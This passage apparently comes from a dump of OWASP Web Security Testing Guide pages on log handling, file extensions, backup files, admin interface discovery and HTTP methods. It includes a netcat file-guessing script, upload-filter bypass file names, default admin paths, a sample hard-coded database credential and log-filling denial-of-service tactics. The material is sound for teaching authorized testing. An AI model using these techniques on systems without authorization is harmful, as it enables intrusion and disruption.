can introduce a Denial of Service condition. Any attacker with sufficient resources might be able to produce a sufficient number of requests that would fill up the allocated space to log files, if they are not specifically prevented from doing so. However, if the server is not properly configured, the log files will be stored in the same disk partition as the one used for the operating system software or the application itself. This means that if the disk becomes filled, the operating system or the application might fail due to the inability to write on the disk.\n\nTypically in UNIX systems logs will be located in /var (although some server installations might reside in /opt or /usr/local) and it is important to make sure that the directories in which logs are stored are in a separate partition. In some cases, and in order to prevent the system logs from being affected, the log directory of the server software itself (such as /var/log/apache in the Apache web server) should be stored in a dedicated partition.\n\nThis is not to say that logs should be allowed to grow to fill up the file system they reside in. Growth of server logs should be monitored in order to detect this condition since it may be indicative of an attack.\n\nTesting this condition, which can be risky in production environments, can be done by firing off a sufficient and sustained number of requests to see if these requests are logged and if there's a possibility to fill up the log partition through these requests. In some environments where QUERY_STRING parameters are also logged regardless of whether they are produced through GET or POST requests, big queries can be simulated that will fill up the logs faster since, typically, a single request will cause only a small amount of data to be logged, such as date and time, source IP address, URI request, and server result.\n\n#### Log Rotation\n\nMost servers (but few custom applications) will rotate logs in order to prevent them from filling up the file system they reside on. The assumption during log rotation is that the information within them is only necessary for a limited duration.\n\nThis feature should be tested in order to ensure that:\n\n- Logs are kept for the time defined in the security policy, not more and not less.\n- Logs are compressed once rotated (this is a convenience, since it will mean that more logs will be stored for the same available disk space).\n- File system permissions for rotated log files should be the same as (or stricter than) those for the log files themselves. For example, web servers will need to write to the logs they use but they don’t actually need to write to rotated logs, which means that the permissions of the files can be changed upon rotation to prevent the web server process from modifying these.\n\nSome servers might rotate logs when they reach a given size. If this happens, it must be ensured that an attacker cannot force logs to rotate in order to hide his tracks.\n\n#### Log Access Control\n\nEvent log information should never be visible to end users. Even web administrators should not have access to such logs as it breaches separation of duty controls. Ensure that any access control schema that is used to protect access to raw logs, and any application providing capabilities to view or search the logs are not linked with access control schemas for other application user roles. Neither should any log data be visible to unauthenticated users.\n\n#### Log Review\n\nReviewing logs can be used not only for extracting usage statistics of files in web servers (which is typically what most log-based applications focus on) but also for determining if attacks are occurring on the web server.\n\nIn order to analyze web server attacks, the error log files of the server need to be analyzed. Review should concentrate on:\n\n- 40x (not found) error messages. A large amount of these from the same source might be indicative of a CGI scanner tool being used against the web server\n- 50x (server error) messages. These can be an indication of an attacker abusing parts of the application which fail unexpectedly. For example, the first phases of a SQL injection attack will produce these error message when the SQL query is not properly constructed and its execution fails on the backend database.\n\nLog statistics or analysis should not be generated or stored in the same server that produces the logs. Otherwise, an attacker might, through a web server vulnerability or improper configuration, gain access to them and retrieve similar information as would be disclosed by log files themselves.\n\n## References\n\n- Apache\n    - Apache Security, by Ivan Ristic, O’reilly, March 2005.\n    - [Apache Security Secrets: Revealed (Again), Mark Cox, November 2003](https://awe.com/mark/talks/apachecon2003us.html)\n    - [Apache Security Secrets: Revealed, ApacheCon 2002, Las Vegas, Mark J Cox, October 2002](https://awe.com/mark/talks/apachecon2002us.html)\n    - [Performance Tuning](https://httpd.apache.org/docs/current/misc/perf-tuning.html)\n- Lotus Domino\n    - Lotus Security Handbook, William Tworek et al., April 2004, available in the IBM Redbooks collection\n    - Lotus Domino Security, an X-force white-paper, Internet Security Systems, December 2002\n    - Hackproofing Lotus Domino Web Server, David Litchfield, October 2001\n- Microsoft IIS\n    - [Security Best Practices for IIS 8](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/jj635855(v=ws.11))\n    - [CIS Microsoft IIS Benchmarks](https://www.cisecurity.org/benchmark/microsoft_iis/)\n    - Securing Your Web Server (Patterns and Practices), Microsoft Corporation, January 2004\n    - IIS Security and Programming Countermeasures, by Jason Coombs\n    - From Blueprint to Fortress: A Guide to Securing IIS 5.0, by John Davis, Microsoft Corporation, June 2001\n    - Secure IIS 5 Checklist, by Michael Howard, Microsoft Corporation, June 2000\n- Red Hat’s (formerly Netscape’s) iPlanet\n    - Guide to the Secure Configuration and Administration of iPlanet Web Server, Enterprise Edition 4.1, by James M Hayes, The Network Applications Team of the Systems and Network Attack Center (SNAC), NSA, January 2001\n- WebSphere\n    - IBM WebSphere V5.0 Security, WebSphere Handbook Series, by Peter Kovari et al., IBM, December 2002.\n    - IBM WebSphere V4.0 Advanced Edition Security, by Peter Kovari et al., IBM, March 2002.\n- General\n    - [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html), OWASP\n    - [SP 800-92](https://csrc.nist.gov/publications/detail/sp/800-92/final) Guide to Computer Security Log Management, NIST\n    - [PCI DSS v3.2.1](https://www.pcisecuritystandards.org/document_library) Requirement 10 and PA-DSS v3.2 Requirement 4, PCI Security Standards Council\n\n- Generic:\n    - [CERT Security Improvement Modules: Securing Public Web Servers](https://resources.sei.cmu.edu/asset_files/SecurityImprovementModule/2000_006_001_13637.pdf)\n", "timestamp": "2025-10-24T11:39:43.894732"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md", "content": "# Test File Extensions Handling for Sensitive Information\n\n|ID          |\n|------------|\n|WSTG-CONF-03|\n\n## Summary\n\nWeb servers commonly use file extensions to determine which technologies, languages, and plugins must be used to fulfill web requests. While this behavior is consistent with RFCs and Web Standards, using standard file extensions provides the penetration tester useful information about the underlying technologies used in a web appliance and greatly simplifies the task of determining the attack scenario to be used on particular technologies. In addition, mis-configuration of web servers could easily reveal confidential information about access credentials.\n\nFile extension checks are often done to validate files before uploading them to the server. Unrestricted file uploads can lead to unforeseen results because the content may not be what is expected, or due to unexpected OS filename handling.\n\nUnderstanding how web servers handle requests for files with different extensions can clarify server behavior based on the types of files accessed. For example, it can help to understand which file extensions are returned as text or plain versus those that cause server-side execution. The latter are indicative of technologies, languages, or plugins used by web servers or application servers. This information may provide additional insight into how the web application is engineered. For example, while a \".pl\" extension is typically associated with server-side Perl support, the file extension alone can be misleading and not entirely indicative of the underlying technology. Take, for instance, server-side resources written in Perl, which might be renamed to disguise the usage of Perl. See the next section on \"web server components\" for more on identifying server-side technologies and components.\n\n## Test Objectives\n\n- Brute force sensitive file extensions that might contain raw data such as scripts, credentials, etc.\n- Validate that no system framework bypasses exist for the rules that have been set\n\n## How to Test\n\n### Forced Browsing\n\nSubmit requests with different file extensions and verify how they are handled. The verification should be on a per web directory basis. Verify directories that allow script execution. Web server directories can be identified by scanning tools which look for the presence of well-known directories. Additionally, mirroring the site structure helps testers reconstruct the directory tree served by the application.\n\nIf the web application architecture is load-balanced, it is important to assess all of the web servers. The ease of this task depends on the configuration of the balancing infrastructure. In an infrastructure with redundant components, there may be slight variations in the configuration of individual web or application servers. This may happen if the web architecture employs heterogeneous technologies (think of a set of IIS and Apache web servers in a load-balancing configuration, which may introduce slight asymmetric behavior between them, and possibly different vulnerabilities).\n\n#### Example\n\nThe tester has identified the existence of a file named `connection.inc`. Trying to access it directly gives back its contents, which are:\n\n```php\n<?\n    mysql_connect(\"127.0.0.1\", \"root\", \"password\")\n        or die(\"Could not connect\");\n?>\n```\n\nThe tester determines the existence of a MySQL DBMS backend and the weak credentials used by the web application to access it.\n\nThe following file extensions should never be returned by a web server, as they pertain to files that could contain sensitive information or files that have no valid reason to be served.\n\n- `.asa`\n- `.inc`\n- `.config`\n\nThe following file extensions are related to files which, when accessed, are either displayed or downloaded by the browser. Therefore, files with these extensions must be checked to verify that they are indeed supposed to be served (and are not leftovers), and that they do not contain sensitive information.\n\n- `.zip`, `.tar`, `.gz`, `.tgz`, `.rar`, etc.: (Compressed) archive files\n- `.java`: No reason to provide access to Java source files\n- `.txt`: Text files\n- `.pdf`: PDF documents\n- `.docx`, `.rtf`, `.xlsx`, `.pptx`, etc.: Office documents\n- `.bak`, `.old` and other extensions indicative of backup files (for example: `~` for Emacs backup files)\n\nThe list given above details only a few examples, since file extensions are too many to be comprehensively treated here. Refer to [FILExt](https://filext.com/) for a more thorough database of extensions.\n\nTo identify files with a given extension, a mix of techniques can be employed. These techniques can include using vulnerability scanners, spidering and mirroring tools, and querying search engines (see [Testing: Spidering and googling](../01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md)). Manual inspection of the application can also be beneficial, as it overcomes limitations in automatic spidering. See also [Testing for Old, Backup and Unreferenced Files](04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md) which deals with the security issues related to \"forgotten\" files.\n\n### File Upload\n\nWindows 8.3 legacy file handling can sometimes be used to defeat file upload filters.\n\nUsage examples:\n\n1. `file.phtml` gets processed as PHP code.\n2. `FILE~1.PHT` is served, but not processed by the PHP ISAPI handler.\n3. `shell.phPWND` can be uploaded.\n4. `SHELL~1.PHP` will be expanded and returned by the OS shell, then processed by the PHP ISAPI handler.\n\n### Gray-Box Testing\n\nWhite-box testing of file extension handling involves checking the server configurations in the web application architecture and verifying the rules for serving different file extensions.\n\nIf the web application relies on a load-balanced, heterogeneous infrastructure, determine whether this may introduce different behavior.\n\n## Tools\n\nVulnerability scanners, such as Nessus and Nikto, check for the existence of well-known web directories. They may allow the tester to download the site structure, which is helpful when trying to determine the configuration of web directories and how individual file extensions are served. Other tools that can be used for this purpose include:\n\n- [wget](https://www.gnu.org/software/wget)\n- [curl](https://curl.haxx.se)\n- Perform a Google search for \"web mirroring tools\"\n", "timestamp": "2025-10-24T11:39:43.978415"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md", "content": "# Review Old Backup and Unreferenced Files for Sensitive Information\n\n|ID          |\n|------------|\n|WSTG-CONF-04|\n\n## Summary\n\nWhile most of the files within a web server are directly handled by the server itself, it isn't uncommon to find unreferenced or forgotten files that can be used to obtain important information about the infrastructure or the credentials.\n\nMost common scenarios include the presence of renamed old versions of modified files, inclusion files that are loaded into the language of choice and downloaded as source, and even automatic or manual backups in the form of compressed archives. Backup files can also be generated automatically by the underlying file system the application is hosted on, a feature usually referred to as \"snapshots\".\n\nAll these files may grant the tester access to inner workings, back doors, administrative interfaces, or even credentials to connect to the administrative interface or the database server.\n\nAn important source of vulnerability is found in files unrelated to the application. These files may be created when editing application files, creating on-the-fly backup copies, or leaving old or unreferenced files in the web tree. Performing in-place editing or other administrative actions on production web servers may inadvertently leave backup copies, either generated automatically by the editor while editing files, or by the administrator who is zipping a set of files to create a backup.\n\nIt is easy to forget such files and this may pose a serious security threat to the application. It happens because backup copies may be generated with file extensions differing from those of the original files. A `.tar`, `.zip` or `.gz` archive that we generate (and might forget) has obviously a different extension, and the same happens with automatic copies created by many editors (for example, emacs generates a backup copy named `file~` when editing `file`). Making a copy manually can produce a similar effect, such as when 'file' is copied as 'file.old'. The underlying file system the application is on could be making `snapshots` of your application at different points in time without your knowledge, which may also be accessible via the web, posing a similar but different `backup file` style threat to your application.\n\nAs a result, these activities generate files that are not needed by the application and may be handled differently than the original file by the web server. For example, if we make a copy of login.asp and name it login.asp.old without proper security measures, it could potentially allow users to download the source code of login.asp. This is because `login.asp.old` will be typically served as text or plain, rather than being executed because of its extension. In other words, accessing `login.asp` causes the execution of the server-side code of `login.asp`, while accessing `login.asp.old` causes the content of `login.asp.old` (which is, again, server-side code) to be plainly returned to the user and displayed in the browser. This may pose security risks, since sensitive information may be revealed.\n\nGenerally, exposing server-side code is a bad idea. Not only are you unnecessarily exposing business logic, but you may be unknowingly revealing application-related information which may help an attacker (path names, data structures, etc.). Not to mention the fact that there are too many scripts with embedded username and password in clear text (which is a careless and extremely dangerous practice).\n\nOther causes of unreferenced files are due to design or configuration choices when they allow diverse kind of application-related files such as data files, configuration files, log files, to be stored in file system directories that can be accessed by the web server. These files have normally no reason to be in a file system space that could be accessed via web, since they should be accessed only at the application level, by the application itself (and not by the casual user browsing around).\n\n### Threats\n\nOld, backup and unreferenced files present various threats to the security of a web application:\n\n- Unreferenced files may disclose sensitive information that can facilitate a focused attack against the application; for example, include files containing database credentials, configuration files containing references to other hidden content, absolute file paths, etc.\n- Unreferenced pages may contain powerful functionality that can be used to attack the application; for example, an administration page that is not linked from published content but can be accessed by any user who knows where to find it.\n- Old and backup files may contain vulnerabilities that have been fixed in more recent versions; for example, `viewdoc.old.jsp` may contain a directory traversal vulnerability that has been fixed in `viewdoc.jsp` but can still be exploited by anyone who finds the old version.\n- Backup files may disclose the source code for pages designed to execute on the server; for example, requesting `viewdoc.bak` may return the source code for `viewdoc.jsp`, which can be reviewed for vulnerabilities that may be difficult to find by making blind requests to the executable page. While this threat applies to scripting languages such as Perl, PHP, ASP, shell scripts, JSP, etc., it is not limited to them, as shown in the example provided in the next point.\n- Backup archives may contain copies of all files within (or even outside) the webroot. This allows an attacker to quickly enumerate the entire application, including unreferenced pages, source code, include files, etc. For example, if you forget a file named `myservlets.jar.old` containing a backup copy of your servlet implementation classes, you are exposing a lot of sensitive information which can be decompiled and reverse engineered.\n- In some cases, copying or editing a file modifies the filename but leaves the file extension intact. This is common in Windows environments, where file copying operations generate filenames prefixed with \"Copy of \" or localized versions of this string. Since the file extension is left unchanged, this is not a case where an executable file is returned as plain text by the web server, and therefore not a case of source code disclosure. However, these files are dangerous too because there is a chance that they include obsolete and incorrect logic that, when invoked, could trigger application errors, which might yield valuable information to an attacker if diagnostic message display is enabled.\n- Log files may contain sensitive information about the activities of application users, for example, sensitive data passed in URL parameters, session IDs, URLs visited (which may disclose additional unreferenced content), etc. Other log files (e.g. ftp logs) may contain sensitive information about the maintenance of the application by system administrators.\n- File system snapshots may contain copies of the code that contain vulnerabilities that have been fixed in more recent versions. For example, `/.snapshot/monthly.1/view.php` may contain a directory traversal vulnerability that has been fixed in `/view.php` but can still be exploited by anyone who finds the old version.\n\n## Test Objectives\n\n- Find and analyse unreferenced files that might contain sensitive information.\n\n## How to Test\n\n### Black-Box Testing\n\nTesting for unreferenced files uses both automated and manual techniques, and typically involves a combination of the following:\n\n#### Inference from the Naming Scheme Used for Published Content\n\nEnumerate all of the application’s pages and functionality. This can be done manually using a browser, or using an application spidering tool. Most applications use a recognizable naming scheme, and organize resources into pages and directories using words that describe their function. It is often possible to infer the name and location of unreferenced pages from the naming scheme used for published content. For example, if a page titled viewuser.asp is found, one should also look for edituser.asp, adduser.asp, and deleteuser.asp. Similarly, if a directory /app/user is discovered, one should also search for /app/admin and /app/manager.\n\n#### Other Clues in Published Content\n\nMany web applications leave clues in published content that can lead to the discovery of hidden pages and functionality. These clues can often be found in the source code of HTML and JavaScript files. The source code for all published content should be manually reviewed to identify clues about other pages and functionality. For example:\n\nProgrammers' comments and commented-out sections of source code may refer to hidden content:\n\n```html\n<!-- <A HREF=\"uploadfile.jsp\">Upload a document to the server</A> -->\n<!-- Link removed while bugs in uploadfile.jsp are fixed          -->\n```\n\nJavaScript may contain page links that are only rendered within the user’s GUI under certain circumstances:\n\n```javascript\nvar adminUser=false;\nif (adminUser) menu.add (new menuItem (\"Maintain users\", \"/admin/useradmin.jsp\"));\n```\n\nHTML pages may contain FORMs that have been hidden by disabling the SUBMIT element:\n\n```html\n<form action=\"forgotPassword.jsp\" method=\"post\">\n    <input type=\"hidden\" name=\"userID\" value=\"123\">\n    <!-- <input type=\"submit\" value=\"Forgot Password\"> -->\n</form>\n```\n\nAnother source of clues about unreferenced directories is the `/robots.txt` file used to provide instructions to web robots:\n\n```html\nUser-agent: *\nDisallow: /Admin\nDisallow: /uploads\nDisallow: /backup\nDisallow: /~jbloggs\nDisallow: /include\n```\n\n#### Blind Guessing\n\nIn its simplest form, this involves running a list of common filenames through a request engine in an attempt to guess files and directories that exist on the server. The following netcat wrapper script will read a wordlist from stdin and perform a basic guessing attack:\n\n```bash\n#!/bin/bash\n\nserver=example.org\nport=80\n\nwhile read url\ndo\necho -ne \"$url\\t\"\necho -e \"GET /$url HTTP/1.0\\nHost: $server\\n\" | netcat $server $port | head -1\ndone | tee outputfile\n```\n\nDepending upon the server, GET may be replaced with HEAD for faster results. The output file specified can be grepped for \"interesting\" response codes. The response code 200 (OK) usually indicates that a valid resource has been found (provided the server does not deliver a custom \"not found\" page using the 200 code). But also look out for 301 (Moved), 302 (Found), 401 (Unauthorized), 403 (Forbidden) and 500 (Internal error), which may also indicate resources or directories that are worthy of further investigation.\n\nThe basic guessing attack should be run against the webroot, and also against all directories that have been identified through other enumeration techniques. More advanced/effective guessing attacks can be performed as follows:\n\n- Identify the file extensions in use within known areas of the application (e.g. JSP, ASPX, HTML), and use a basic wordlist appended with each of these extensions (or use a longer list of common extensions if resources permit).\n- For each file identified through other enumeration techniques, create a custom wordlist derived from that filename. Get a list of common file extensions (including ~, bak, txt, src, dev, old, inc, orig, copy, tmp, swp, etc.) and use each extension before, after, and instead of, the extension of the actual filename.\n\nNote: Windows file copying operations generate filenames prefixed with \"Copy of \" or localized versions of this phrase, hence they do not change file extensions. While \"Copy of \" files typically do not disclose source code when accessed, they might yield valuable information in case they cause errors when invoked.\n\n#### Information Obtained Through Server Vulnerabilities and Misconfiguration\n\nThe most obvious way in which a misconfigured server may disclose unreferenced pages is through directory listing. Request all enumerated directories to identify any which provide a directory listing.\n\nNumerous vulnerabilities have been found in individual web servers which allow an attacker to enumerate unreferenced content, for example:\n\n- Apache ?M=D directory listing vulnerability.\n- Various IIS script source disclosure vulnerabilities.\n- IIS WebDAV directory listing vulnerabilities.\n\n#### Use of Publicly Available Information\n\nPages and functionality in internet-facing web applications that are not referenced from within the application itself may be referenced from other public domain sources. There are various sources of these references:\n\n- Pages that used to be referenced may still appear in the archives of internet search engines. For example, `1998results.asp` may no longer be linked from a company’s site, but may remain on the server and in search engine databases. This old script may contain vulnerabilities that could be used to compromise the entire site. The `site:` Google search operator may be used to run a query only against the domain of choice, such as in: `site:www.example.com`. Using search engines in this way has led to a broad array of techniques which you may find useful, and are described in the `Google Hacking` section of this Guide. Check it to hone your testing skills via Google. Backup files are not likely to be referenced by any other files and therefore may have not been indexed by Google, but if they lie in browsable directories the search engine might know about them.\n- In addition, Google and Yahoo keep cached versions of pages found by their robots. Even if `1998results.asp` has been removed from the target server, a version of its output may still be stored by these search engines. The cached version may contain references to, or clues about, additional hidden content that still remains on the server.\n- Content that is not referenced from within a target application may be linked to by third-party sites. For example, an application which processes online payments on behalf of third-party traders may contain a variety of bespoke functionality which can (normally) only be found by following links within the sites of its customers.\n\n#### Filename Filter Bypass\n\nBecause deny list filters are based on regular expressions, one can sometimes take advantage of obscure OS filename expansion features which work in ways the developer didn't expect. The tester can sometimes exploit differences in ways that filenames are parsed by the application, web server, and underlying OS and it's filename conventions.\n\nExample: Windows 8.3 filename expansion `c:\\\\program files` becomes `C:\\\\PROGRA\\~1`\n\n- Remove incompatible characters\n- Convert spaces to underscores\n- Take the first six characters of the basename\n- Add `~<digit>` which is used to distinguish files with names using the same six initial characters\n- This convention changes after the first 3 name collisions\n- Truncate file extension to three characters\n- Make all the characters uppercase\n\n### Gray-Box Testing\n\nPerforming gray-box testing against old and backup files necessitates the examination of files within directories that belong to the set of web directories served by the web server(s) comprising the web application infrastructure. Theoretically the examination should be performed by hand to be thorough. However, since in most cases copies of files or backup files tend to be created by using the same naming conventions, the search can be easily scripted. For example, editors leave behind backup copies by naming them with a recognizable extension or ending and humans tend to leave behind files with a `.old` or similar predictable extensions. A useful strategy would be to periodically schedule a background job to check for files with extensions that are likely to be identified as copies or backup files, while also performing manual checks on a longer time basis.\n\n## Remediation\n\nFor an effective protection strategy, testing should be combined with a security policy that clearly forbids dangerous practices, including:\n\n- Editing files in-place on the web server or application server file systems. This is a particularly bad habit, since it is likely to generate backup or temporary files by the editors. It is amazing to see how often this is done, even in large organizations. If you absolutely need to edit files on a production system, do ensure that you don’t leave behind anything that is not explicitly intended, and keep in mind that you are doing it at your own risk.\n- Carefully check any other activity performed on file systems exposed by the web server, such as spot administration activities. For example, if you occasionally need to take a snapshot of a couple of directories (which you should not do on a production system), you may be tempted to zip them first. Be careful not to leave behind such archive files.\n- Appropriate configuration management policies should help prevent obsolete and un-referenced files.\n- Applications should be designed not to create (or rely on) files stored under the web directory trees served by the web server. Data files, log files, configuration files, etc. should be stored in directories not accessible by the web server to counter the possibility of information disclosure, not to mention the potential for data modification if web directory permissions allow writing.\n- File system snapshots should not be accessible via the web if the document root is on a file system using this technology. Configure your web server to deny access to such directories, for example, under Apache, a location directive like this should be used:\n\n```xml\n<Location ~ \".snapshot\">\n    Order deny,allow\n    Deny from all\n</Location>\n```\n\n## Tools\n\nVulnerability assessment tools tend to include checks to spot web directories having standard names (such as \"admin\", \"test\", \"backup\", etc.), and to report any web directory which allows indexing. If the tester is unable to find directory listing, they should try to check for probable backup extensions. Some tools that can help with this include:\n\n- [Nessus](https://www.tenable.com/products/nessus)\n- [Nikto2](https://cirt.net/Nikto2)\n\nWeb spider tools\n\n- [wget](https://www.gnu.org/software/wget/)\n- [Spike proxy includes a site crawler function](https://www.spikeproxy.com/)\n- [Xenu](https://home.snafu.de/tilman/xenulink.html)\n- [curl](https://curl.haxx.se)\n\nSome of them are also included in standard Linux distributions. Web development tools usually include facilities to identify broken links and unreferenced files.\n", "timestamp": "2025-10-24T11:39:44.089044"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md", "content": "# Enumerate Infrastructure and Application Admin Interfaces\n\n|ID          |\n|------------|\n|WSTG-CONF-05|\n\n## Summary\n\nAdministrator interfaces may be present in the application or on the application server to allow certain users to perform privileged activities on the site. Tests should be undertaken to reveal if and how this privileged functionality can be accessed by an unauthorized or standard user.\n\nAn application may require an administrator interface to enable a privileged user to access functionality that may make changes to how the site functions. Such changes may include:\n\n- user account provisioning\n- site design and layout\n- data manipulation\n- configuration changes\n\nIn many instances, such interfaces do not have sufficient controls to protect them from unauthorized access. Testing is aimed at discovering these administrator interfaces and accessing functionality intended for the privileged users.\n\n## Test Objectives\n\n- Identify hidden administrator interfaces and functionality.\n\n## How to Test\n\n### Black Box Testing\n\nThe following section describes vectors that may be used to test for the presence of administrative interfaces. These techniques may also be used to test for related issues including privilege escalation, and are described elsewhere in this guide (for example, [Testing for bypassing authorization schema](../05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md) and [Testing for Insecure Direct Object References](../05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)) in greater detail.\n\n- Directory and file enumeration: An administrative interface may be present but not visibly available to the tester. The path of the administrative interface may be guessed by simple requests such as /admin or /administrator. In some scenarios, these paths can be revealed within seconds using advanced Google search techniques - [Google dorks](https://www.exploit-db.com/google-hacking-database). There are many tools available to perform brute forcing of server contents, see the tools section below for more information. A tester may have to also identify the filename of the administration page. Forcibly browsing to the identified page may provide access to the interface.\n- Comments and links in source code: Many sites use common code that is loaded for all site users. By examining all source sent to the client, links to administrator functionality may be discovered and should be investigated.\n- Reviewing server and application documentation: If the application server or application is deployed in its default configuration it may be possible to access the administration interface using information described in configuration or help documentation. Default password lists should be consulted if an administrative interface is found and credentials are required.\n- Publicly available information: Many applications, such as WordPress, have administrative interfaces that are available by default.\n- Alternative server port: Administration interfaces may be seen on a different port on the host than the main application. For example, Apache Tomcat's Administration interface can often be seen on port 8080.\n- Parameter tampering: A GET or POST parameter, or a cookie may be required to enable the administrator functionality. Clues to this include the presence of hidden fields such as:\n\n```html\n<input type=\"hidden\" name=\"admin\" value=\"no\">\n```\n\nor in a cookie:\n\n`Cookie: session_cookie; useradmin=0`\n\nOnce an administrative interface has been discovered, a combination of the above techniques may be used to attempt to bypass authentication. If this fails, the tester may wish to attempt a brute force attack. In such an instance, the tester should be aware of the potential for administrative account lockout if such functionality is present.\n\n### Gray Box Testing\n\nA more detailed examination of the server and application components should be undertaken to ensure hardening (i.e. administrator pages are not accessible to everyone through the use of IP filtering or other controls), and where applicable, verification that all components do not use default credentials or configurations.\nSource code should be reviewed to ensure that the authorization and authentication model ensures clear separation of duties between normal users and site administrators. User interface functions shared between normal and administrator users should be reviewed to ensure clear separation between the rendering of such components and the information leakage from such shared functionality.\n\nEach web framework may have its own default admin pages or paths, as in the following examples:\n\nPHP:\n\n```html\n/phpinfo\n/phpmyadmin/\n/phpMyAdmin/\n/mysqladmin/\n/MySQLadmin\n/MySQLAdmin\n/login.php\n/logon.php\n/xmlrpc.php\n/dbadmin\n```\n\nWordPress:\n\n```html\nwp-admin/\nwp-admin/about.php\nwp-admin/admin-ajax.php\nwp-admin/admin-db.php\nwp-admin/admin-footer.php\nwp-admin/admin-functions.php\nwp-admin/admin-header.php\n```\n\nJoomla:\n\n```html\n/administrator/index.php\n/administrator/index.php?option=com_login\n/administrator/index.php?option=com_content\n/administrator/index.php?option=com_users\n/administrator/index.php?option=com_menus\n/administrator/index.php?option=com_installer\n/administrator/index.php?option=com_config\n```\n\nTomcat:\n\n```html\n/manager/html\n/host-manager/html\n/manager/text\n/tomcat-users.xml\n```\n\nApache:\n\n```html\n/index.html\n/httpd.conf\n/apache2.conf\n/server-status\n```\n\nNginx:\n\n```html\n/index.html\n/index.htm\n/index.php\n/nginx_status\n/index.php\n/nginx.conf\n/html/error\n```\n\n## Tools\n\nSeveral tools can assist in identifying hidden administrator interfaces and functionality, including:\n\n- [ZAP - Forced Browse](https://www.zaproxy.org/docs/desktop/addons/forced-browse/) is a currently maintained use of OWASP's previous DirBuster project.\n- [THC-HYDRA](https://github.com/vanhauser-thc/thc-hydra) is a tool that allows brute-forcing of many interfaces, including form-based HTTP authentication.\n- A brute forcer is much more effective when it uses a good dictionary, such as the [Netsparker](https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/) dictionary.\n\n## References\n\n- [Cirt: Default Password list](https://cirt.net/passwords)\n- [FuzzDB can be used to do brute force browsing admin login path](https://github.com/fuzzdb-project/fuzzdb/blob/master/discovery/predictable-filepaths/login-file-locations/Logins.txt)\n- [Common admin or debugging parameters](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/business-logic/CommonDebugParamNames.txt)\n", "timestamp": "2025-10-24T11:39:44.195515"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md", "content": "# Test HTTP Methods\n\n|ID          |\n|------------|\n|WSTG-CONF-06|\n\n## Summary\n\nHTTP offers a number of methods (or verbs) that can be used to perform actions on the web server. While GET and POST are by far the most common methods that are used to access information provided by a web server, there are a variety of other methods that may also be supported, and can sometimes be exploited by attackers.\n\n[RFC 7231](https://datatracker.ietf.org/doc/html/rfc7231) defines the main valid HTTP request methods (or verbs), although additional methods have been added in other RFCs, such as [RFC 5789](https://datatracker.ietf.org/doc/html/rfc5789). Several of these verbs have been re-used for different purposes in [RESTful](https://en.wikipedia.org/wiki/Representational_state_transfer) applications, listed in the table below.\n\n| Method | Original Purpose | RESTful Purpose |\n|--------|------------------|-----------------|\n| [`GET`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.1) | Request a file. | Request an object.|\n| [`HEAD`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.2) | Request a file, but only return the HTTP headers. | |\n| [`POST`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.3) | Submit data. | |\n| [`PUT`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.4) | Upload a file. | Create an object. |\n| [`DELETE`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.5) | Delete a file | Delete an object. |\n| [`CONNECT`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.6) | Establish a connection to another system. | |\n| [`OPTIONS`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.7) | List supported HTTP methods. | Perform a [CORS Preflight](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request) request. |\n| [`TRACE`](https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.8) | Echo the HTTP request for debug purposes. | |\n| [`PATCH`](https://datatracker.ietf.org/doc/html/rfc5789#section-2) |  | Modify an object. |\n\n## Test Objectives\n\n- Enumerate supported HTTP methods.\n- Test for access control bypass.\n- Test HTTP method overriding techniques.\n\n## How to Test\n\n### Discover the Supported Methods\n\nTo perform this test, the tester needs a way to identify which HTTP methods are supported by the web server that is being examined. The simplest way to do this is to make an `OPTIONS` request to the server:\n\n```http\nOPTIONS / HTTP/1.1\nHost: example.org\n```\n\nThe server should then respond with a list of supported methods:\n\n```http\nHTTP/1.1 200 OK\nAllow: OPTIONS, GET, HEAD, POST\n```\n\nHowever, not all servers may respond to OPTIONS requests, and some may even return inaccurate information. It's also worth noting that servers may support different methods for different paths. This means that even if a method is not supported for the root / directory, it does not necessarily indicate that the same method won't be supported elsewhere.\n\nA more reliable way to test for supported methods is to simply make a request with that method type, and examine the server response. If the method is not permitted, the server should return a `405 Method Not Allowed` status.\n\nNote that some servers treat unknown methods as equivalent to `GET`, so they may respond to arbitrary methods, such as the request 